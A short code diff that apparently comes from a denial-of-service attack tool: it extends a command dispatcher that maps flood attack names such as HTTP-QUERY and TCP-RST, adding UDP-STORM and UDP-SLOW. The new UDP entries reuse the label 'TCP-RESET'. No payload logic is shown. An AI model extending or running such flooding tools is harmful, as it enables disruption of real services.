@@ -107,6 +107,8 @@ def controler():
         elif a in ['HTTPQUERY','HTTP_QUERY','HTTP-QUERY']:handle_attack_command(com, languages, 'HTTP-QUERY',4)
         elif a in ['HTTP_19','HTTP-19']:handle_attack_command(com, languages, 'HTTP-19',5)
         elif a in ['TCP-RST','TCPRST','TCP_RST']:handle_attack_command(com, languages, 'TCP-RESET',2)
+        elif a in ['UDP-STORM','UDPSTORM','UDP_STORM']:handle_attack_command(com, languages, 'TCP-RESET',2,'UDP-STORM')
+        elif a in ['UDP-SLOW','UDPSLOW','UDP_SLOW']:handle_attack_command(com, languages, 'TCP-RESET',2,'UDP-SLOW')
         elif a == 'PAPING':
            if len(com) == 5:
               ip = com[1]
